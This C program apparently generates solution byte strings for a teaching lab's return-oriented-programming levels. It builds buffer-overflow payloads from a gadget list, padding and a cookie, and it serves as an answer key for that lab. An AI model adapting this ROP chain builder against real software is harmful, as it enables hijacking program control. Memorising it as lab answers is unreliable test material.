/* Generate exploit string */

/* Input is text file consisting of tab-separated fields
   Starting address of gadget
   Gadget operation
   0-2 arguments
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "gencode.h"

int verbose = 0;

typedef enum { OP_NOP, OP_RET, OP_POP, OP_MOVL, OP_MOVQ, OP_ADD } op_t;

/* Gadget record */
typedef struct GDT gdt_rec, *gdt_ptr;

struct GDT {
    size_t addr;
    unsigned char op;
    unsigned char arg1;
    unsigned char arg2;
};
   
#define OP_CNT 6
char *opnames[OP_CNT] = { "nop", "ret", "pop", "movl", "movq", "add" };

static int find_op(char *opname)
{
    int i;
    for (i = 0; i < OP_CNT; i++)
	if (strcmp(opname, opnames[i]) == 0)
	    return i;
    return OP_CNT;
}
    
static char namebuf[100];


static char *show_gadget(gdt_ptr gdt) {
    sprintf(namebuf, "0x%lx %s %d,%d", gdt->addr, opnames[gdt->op], gdt->arg1, gdt->arg2);
    return namebuf;
}

static gdt_ptr new_gadget(size_t addr, unsigned char op, unsigned char arg1, unsigned char arg2) {
    gdt_ptr result = malloc(sizeof(gdt_rec));
    result->addr = addr;
    result->op = op;
    result->arg1 = arg1;
    result->arg2 = arg2;
    return result;
}


#define MAXGDT 500
static gdt_ptr gadgets[MAXGDT];
static int gadget_cnt = 0;

/* Find gadget meeting required conditions.  Return NULL if none found */
static gdt_ptr find_gadget(unsigned char op, unsigned char arg1, unsigned char arg2) {
    int g;
    for (g = 0; g < gadget_cnt; g++) {
	gdt_ptr gdt = gadgets[g];
	if (gdt->op == op && gdt->arg1 == arg1 && gdt->arg2 == arg2) {
	    if (verbose >= 2)
		printf("Found gadget %s\n", show_gadget(gdt));
	    return gdt;
	}
    }
    return NULL;
}


static void load_gadgets(FILE *in) {
    char *buf;
    size_t n;
    char *cur, *next;
    size_t addr;
    char *opname;
    unsigned op;
    unsigned arg1 = 0;
    unsigned arg2 = 0;
    /* Read start address */
    buf = NULL;
    while (getline(&buf, &n, in) >= 0) {
	cur = buf;
	addr = strtoul(cur, &next, 16);
	cur = next+1;
	opname = strsep(&cur, ":");
	op = find_op(opname);
	arg1 = strtoul(cur, &next, 10);
	cur = next+1;
	arg2 = strtoul(cur, &next, 10);
	gdt_ptr gdt = new_gadget(addr, op, arg1, arg2);
	gadgets[gadget_cnt++] = gdt;
	if (verbose >= 2)
	    printf("Added gadget %s\n", show_gadget(gdt));
	buf = NULL;
    }
    if (verbose >= 1)
	printf("Working with %d gadgets\n", gadget_cnt);
}

/* Generate byte pattern */
static void show_bytes(FILE *out, unsigned char *bytes, int len, char *comment) {
    if (comment)
	fprintf(out, "/* %s */\n", comment);
    int i;
    for (i = 0; i < len; i++) {
	fprintf(out, " %.2x", bytes[i]);
    }
    fprintf(out, "\n");
}

/* Generate padding bytes */
static void show_pad(FILE *out, int len) {
    unsigned char *buf = calloc(len, 1);
    char cbuf[20];
    sprintf(cbuf, "Pad with %d bytes", len);
    show_bytes(out, buf, len, cbuf);
    free(buf);
}

/* Generate byte pattern for size_t */
static void show_size_t(FILE *out, size_t val, char *comment) {
    unsigned char buf[sizeof(size_t)];
    int i;
    for (i = 0; i < sizeof(size_t); i++)
	buf[i] = (val >> (8*i)) & 0xFF;
    show_bytes(out, buf, sizeof(size_t), comment);
}

/* Generate byte pattern for string */
static void show_string(FILE *out, char *s, char *comment) {
    show_bytes(out, (unsigned char *) s, strlen(s)+1, comment);
}

/* Useful registers for intermediate values */
unsigned iregs[2] = {RCX, RDX};

/* Level 2 requires finding way to pop value from stack and move result to %rdi */
static int pop_to_rdi(FILE *out, size_t val) {
    gdt_ptr gpop = NULL;
    gdt_ptr gmov = NULL;
    gpop = find_gadget(OP_POP, RAX, 0);
    gmov = find_gadget(OP_MOVQ, RAX, RDI);
    int ok = 1;
    if (!gpop) {
	fprintf(stderr, "Cannot generate solution.  Cannot pop to rax\n");
	ok = 0;
    }
    if (!gmov) {
	fprintf(stderr, "Cannot generate solution.  Cannot move rax to rdi\n");
	ok = 0;
    }
    if (!ok)
	return 0;
    char cbuf[100];
    sprintf(cbuf, "Pop to %s", rname[RAX]);
    show_size_t(out, gpop->addr, cbuf);
    sprintf(cbuf, "Stack data = 0x%lx", val);
    show_size_t(out, val, cbuf);
    sprintf(cbuf, "Move from %s to %s", rname[RAX], rname[RDI]);
    show_size_t(out, gmov->addr, cbuf);
    return 1;
    
}

/* Level 3 requires finding way to move %rsp to %rdi */
static int rsp_to_rdi(FILE *out) {
    /* Consider possible intermediate hops */
    gdt_ptr gmovs = find_gadget(OP_MOVQ, RSP, RAX);
    gdt_ptr gmov = find_gadget(OP_MOVQ, RAX, RDI);
    int ok = 1;
    if (!gmovs) {
	fprintf(stderr, "Cannot generate solution.  Cannot move rsp to rax\n");
	ok = 0;
    }
    if (!gmov) {
	fprintf(stderr, "Cannot generate solution.  Cannot move rax to rdi\n");
	ok = 0;
    }
    if (!ok)
	return 0;
    char cbuf[100];
    sprintf(cbuf, "Move %s to %s", rname[RSP], rname[RAX]);
    show_size_t(out, gmovs->addr, cbuf);
    sprintf(cbuf, "Move from %s to %s", rname[RAX], rname[RDI]);
    show_size_t(out, gmov->addr, cbuf);
    return 1;
}

#define PCOUNT 2
/* Level 3 passes value through 2 intermediate registers.  Possible permuations */
unsigned perms[PCOUNT][2] = {{RCX,RDX}, {RDX,RCX}};

/* Level 3 requires finding way to pop and move long result to %esi */
static int pop_to_esi(FILE *out, size_t val) {
    /* Consider possible intermediate hops */
    unsigned r1, r2;
    unsigned p = 0;
    gdt_ptr gpop = find_gadget(OP_POP, RAX, 0);
    gdt_ptr gmov1 = NULL;
    gdt_ptr gmov2 = NULL;
    gdt_ptr gmov3 = NULL;
    r1 = perms[p][0]; r2 = perms[p][1];
    for (p = 0; p < PCOUNT; p++) {
	r1 = perms[p][0];
	r2 = perms[p][1];
	gmov1 = find_gadget(OP_MOVL, RAX, r1);
	gmov2 = find_gadget(OP_MOVL, r1, r2);
	gmov3 = find_gadget(OP_MOVL, r2, RSI);
 	if (gpop && gmov1 && gmov2 && gmov3)
	    break;
    }
    int ok = 1;
    if (!gpop) {
	fprintf(stderr, "Cannot generate solution.  Cannot pop to rax\n");
	ok = 0;
    }
    if (!gmov1) {
	fprintf(stderr, "Cannot generate solution.  Cannot move eax to %s\n", ename[r1]);
	ok = 0;
    }
    if (!gmov2) {
	fprintf(stderr, "Cannot generate solution.  Cannot move %s to %s\n", ename[r1], ename[r2]);
	ok = 0;
    }
    if (!gmov3) {
	fprintf(stderr, "Cannot generate solution.  Cannot move %s to esi\n", ename[r2]);
	ok = 0;
    }
    if (!ok)
	return 0;
    char cbuf[100];
    sprintf(cbuf, "Pop to %s", rname[RAX]);
    show_size_t(out, gpop->addr, cbuf);
    sprintf(cbuf, "Stack data = 0x%lx", val);
    show_size_t(out, val, cbuf);
    sprintf(cbuf, "Move from %s to %s", ename[RAX], ename[r1]);
    show_size_t(out, gmov1->addr, cbuf);
    sprintf(cbuf, "Move from %s to %s", ename[r1], ename[r2]);
    show_size_t(out, gmov2->addr, cbuf);
    sprintf(cbuf, "Move from %s to %s", ename[r2], ename[RSI]);
    show_size_t(out, gmov3->addr, cbuf);
    return 1;
}

static void gen_level1(FILE *out, int padcnt, size_t target) {
    show_pad(out, padcnt);
    char cbuf[100];
    sprintf(cbuf, "Call target function");
    show_size_t(out, target, cbuf);
}

static void gen_level2(FILE *out, int padcnt, unsigned cookie, size_t target) {
    show_pad(out, padcnt);
    if (!pop_to_rdi(out, cookie))
	return;
    char cbuf[100];
    sprintf(cbuf, "Call target function");
    show_size_t(out, target, cbuf);
}

static void gen_level3(FILE *out, int padcnt, unsigned cookie, size_t target) {
    /*
      Amount to add to %rsp to reach string.
      Let S be copied value of stack pointer
      Between copying S to RAX and location of string, require:
      8 bytes for ret to copy RAX to RDI
      8 bytes for ret to add RSI to RDI and store in RAX
      8 bytes to copy RAX to RDI
      8 bytes for call target
    */
    size_t offset = 32;
    char cbuf[100];
    char cstring[9];
    gdt_ptr gadd = find_gadget(OP_ADD, RDI, RSI);
    if (!gadd) {
	gadd = find_gadget(OP_ADD, RSI, RDI);
	if (!gadd) {
	    fprintf(stderr, "Cannot generate solution.  No gadget to add rsi to rdi\n");
	    return;
	}
    }
    gdt_ptr gmov = find_gadget(OP_MOVQ, RAX, RDI);
    if (!gmov) {
	fprintf(stderr, "Cannot generate solution.  No gadget to copy rax to rdi\n");
	return;
    }
    show_pad(out, padcnt);
    if (!pop_to_esi(out, offset))
	return;
    if (!rsp_to_rdi(out))
	return;
    sprintf(cbuf, "Add rsi+rdi to get address for string in rax");
    show_size_t(out, gadd->addr, cbuf);
    sprintf(cbuf, "Move address from rax to rdi");
    show_size_t(out, gmov->addr, cbuf);
    sprintf(cbuf, "Call target function");
    show_size_t(out, target, cbuf);
    sprintf(cstring, "%.8x", cookie);
    sprintf(cbuf, "String representation of cookie");
    show_string(out, cstring, cbuf);
}

static void usage(char *name) {
    printf("Usage: %s -h (-1|-2|-3) -c COOKIE -p PAD -t TGT -i IN -o OUT -v LVL\n", name);
    printf("    -h        Print help information\n");
    printf("    -1        Level 1\n");
    printf("    -2        Level 2\n");
    printf("    -3        Level 3\n");
    printf("    -c COOKIE Specify cookie (hex)\n");
    printf("    -p PAD    Number of padding bytes\n");
    printf("    -t TGT    Specify target function address (hex)\n");
    printf("    -i IN     Specify input file\n");
    printf("    -o OUT    Specify output file\n");
    printf("    -v LVL    Set verbosity level (0-2)\n");
    exit(0);
}


int main(int argc, char *argv[]) {
    FILE *infile = stdin;
    FILE *outfile = stdout;
    int opt;
    int level = 0;
    int padding = 0;
    size_t target = 0;
    unsigned cookie = 0;
    
    while ((opt = getopt(argc, argv, "h123c:p:t:i:o:v:")) > 0) {
	switch(opt) {
	case 'h':
	    usage(argv[0]);
	    break;
	case '1':
	    level = 1;
	    break;
	case '2':
	    level = 2;
	    break;
	case '3':
	    level = 3;
	    break;
	case 'c':
	    cookie = strtoul(optarg, NULL, 16);
	    break;
	case 'p':
	    padding = atoi(optarg);
	    break;
	case 't':
	    target = strtoul(optarg, NULL, 16);
	    break;
	case 'i':
	    infile = fopen(optarg, "r");
	    if (infile == NULL) {
		fprintf(stderr, "Couldn't open input file '%s'\n", optarg);
		exit(1);
	    }
	    break;
	case 'o':
	    outfile = fopen(optarg, "w");
	    if (outfile == NULL) {
		fprintf(stderr, "Couldn't open output file '%s'\n", optarg);
		exit(1);
	    }
	    break;
	case 'v':
	    verbose = atoi(optarg);
	    break;
	default:
	    fprintf(stderr, "Unrecognized option '%c'\n", opt);
	    usage(argv[0]);
	    break;
	}
	
    }
    load_gadgets(infile);
    fclose(infile);
    switch (level) {
    case 1:
	gen_level1(outfile, padding, target);
	break;
    case 2:
	gen_level2(outfile, padding, cookie, target);
	break;
    case 3:
	gen_level3(outfile, padding, cookie, target);
	break;
    default:
	fprintf(stderr, "Unknown level %d\n", level);
	exit(1);
    }
    fclose(outfile);
    return 0;
}
